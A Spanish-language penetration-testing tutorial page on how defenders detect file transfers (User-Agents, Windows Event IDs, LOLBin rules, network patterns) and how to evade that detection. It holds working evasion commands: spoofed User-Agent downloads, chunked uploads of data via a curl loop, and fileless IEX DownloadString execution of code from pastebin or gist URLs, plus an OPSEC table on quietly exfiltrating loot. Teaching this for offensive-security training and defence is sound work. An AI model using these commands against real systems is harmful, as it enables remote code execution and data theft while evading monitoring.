# Detección y Evasión

Entender cómo los defensores detectan las transferencias de archivos permite tomar mejores decisiones OPSEC. Cada método de transferencia deja rastros distintos — en logs, en eventos del sistema, en el tráfico de red.

### Cómo se detectan las transferencias

#### Detección basada en el agente HTTP (User-Agent)

Muchas herramientas de descarga usan User-Agents predecibles que los proxies y sistemas de inspección de tráfico identifican fácilmente:

| Herramienta                    | User-Agent por defecto                                                    |
| ------------------------------ | ------------------------------------------------------------------------- |
| PowerShell `Invoke-WebRequest` | `Mozilla/5.0 (Windows NT; Windows NT X.X; en-US) WindowsPowerShell/5.1.X` |
| PowerShell `Net.WebClient`     | `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; ...)`                 |
| `certutil`                     | `Microsoft-CryptoAPI/X.X`                                                 |
| `bitsadmin`                    | `Microsoft BITS/X.X`                                                      |
| `wget` (Linux)                 | `Wget/X.X (linux-gnu)`                                                    |
| `curl` (Linux)                 | `curl/X.X`                                                                |
| Python `urllib`                | `Python-urllib/3.X`                                                       |

Un proxy corporativo que vea `Python-urllib` descargando un `.exe` desde una IP interna a las 3am generará inmediatamente una alerta.

#### Detección basada en Event IDs (Windows)

```
Event ID 4688 (Process Creation con CommandLine):
→ certutil.exe -urlcache -f http://...
→ powershell.exe -EncodedCommand ...
→ bitsadmin /transfer ...
→ regsvr32.exe /i:http://...
→ mshta.exe http://...

Event ID 4104 (PowerShell ScriptBlock Logging):
→ IEX, Invoke-Expression
→ Net.WebClient, DownloadString, DownloadFile
→ Invoke-WebRequest, iwr
→ Start-BitsTransfer

Event ID 7045 (Nuevo servicio instalado):
→ PsExec instala PSEXESVC.exe como servicio
→ Cualquier servicio con ruta en %TEMP% o %APPDATA%
```

#### Detección basada en tráfico de red

```
Patrones detectables:
→ Conexión HTTP/S a IPs directas (no dominios) — inusual en tráfico legítimo
→ Descarga de ejecutables (.exe, .dll, .ps1) desde fuentes internas inesperadas
→ Tráfico SMB saliente hacia IPs externas
→ Conexiones a puertos no estándar (8080, 8443, 4444...)
→ Transferencias grandes de datos salientes fuera de horario laboral
→ DNS tunneling: consultas DNS largas y frecuentes con subdominios generados algorítmicamente
→ Beaconing: conexiones regulares con intervalos predecibles (C2)
```

#### Detección de LOLBins

Los EDRs modernos tienen reglas específicas para el abuso de binarios legítimos:

* `certutil.exe` descargando desde internet → casi siempre alertado
* `powershell.exe` con `-EncodedCommand` → muy monitorizados
* `mshta.exe` con URL como argumento → raro en uso legítimo
* `regsvr32.exe` con `/i:http://` → muy sospechoso

### Técnicas de evasión

#### Cambiar el User-Agent

La forma más simple de evadir detección basada en User-Agent es cambiarlo por uno legítimo:

```powershell
# Cambiar el User-Agent a Chrome
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
$WebClient.DownloadFile("http://192.168.1.100/archivo.exe", "C:\Temp\archivo.exe")

# Con Invoke-WebRequest
Invoke-WebRequest http://192.168.1.100/archivo.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -OutFile archivo.exe
```

```bash
# curl con User-Agent personalizado
curl -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" http://servidor/archivo -o archivo

# wget con User-Agent personalizado
wget --user-agent="Mozilla/5.0 (X11; Linux x86_64)" http://servidor/archivo
```

#### Usar puertos estándar

Conectar siempre a puertos 80 o 443. Un servidor en `192.168.1.100:4444` llama la atención; uno en `192.168.1.100:443` parece tráfico web legítimo.

#### Cifrar las transferencias

* Usar HTTPS en lugar de HTTP
* Usar SCP/SFTP en lugar de FTP
* Usar Ncat con SSL en lugar de Netcat
* Cifrar el archivo antes de transferirlo (ver [Transferencias Protegidas](https://claude.ai/chat/05-protected.md))

#### Fragmentar las transferencias

Dividir archivos grandes en fragmentos pequeños que pasen desapercibidos individualmente:

```bash
# Linux — dividir en fragmentos de 500KB
split -b 500k archivo.zip fragmento_

# Transferir cada fragmento individualmente
for f in fragmento_*; do
    curl -s http://servidor/upload -F "files=@$f"
done

# Reensamblar en el destino
cat fragmento_* > archivo.zip
```

```powershell
# Windows — dividir
$bytes = [System.IO.File]::ReadAllBytes("C:\archivo.zip")
$chunkSize = 500KB
for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
    $chunk = $bytes[$i..([Math]::Min($i + $chunkSize - 1, $bytes.Length - 1))]
    [System.IO.File]::WriteAllBytes("C:\fragmento_$($i/1KB).bin", $chunk)
}
```

#### Aprovechar servicios legítimos como proxy

En lugar de conectar directamente al servidor atacante, usar servicios que no estén bloqueados como intermediarios:

```powershell
# Descargar desde un paste (si están permitidos)
IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/XXXXXXXX')

# Desde GitHub Gists (si está permitido)
IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/usuario/...')
```

#### Horario y velocidad

* Transferir durante el horario laboral cuando el tráfico es mayor
* Limitar la velocidad de transferencia para no generar picos anómalos
* Espaciar las transferencias en lugar de hacerlas todas a la vez

### Resumen OPSEC para transferencias

| Acción                | Ruidosa                              | Silenciosa                                |
| --------------------- | ------------------------------------ | ----------------------------------------- |
| Descargar herramienta | `certutil -urlcache`                 | `BITS`, PowerShell con UA legítimo        |
| Transferir por red    | HTTP en claro, puerto custom         | HTTPS, puerto 443, User-Agent normal      |
| Subir loot            | HTTP en claro, archivo en texto      | HTTPS, archivo cifrado previamente        |
| Ejecutar en memoria   | Escribir en disco y ejecutar         | `IEX` + `DownloadString` (fileless)       |
| Usar LOLBin           | `certutil`, `mshta` (muy detectados) | `OpenSSL`, `BITS`, PowerShell con evasión |

> La detección más efectiva contra transferencias no se basa en el protocolo sino en el **comportamiento**: un proceso de Office descargando un ejecutable es sospechoso independientemente de si usa HTTP, FTP o SMB. El EDR detecta la cadena padre → hijo y la acción, no solo el protocolo.

> Desde la perspectiva defensiva, habilitar **PowerShell ScriptBlock Logging** (Event ID 4104) y **Process Creation Logging con CommandLine** (Event ID 4688) son las dos medidas que más dificultan el uso de LOLBins y PowerShell para transferencias silenciosas.
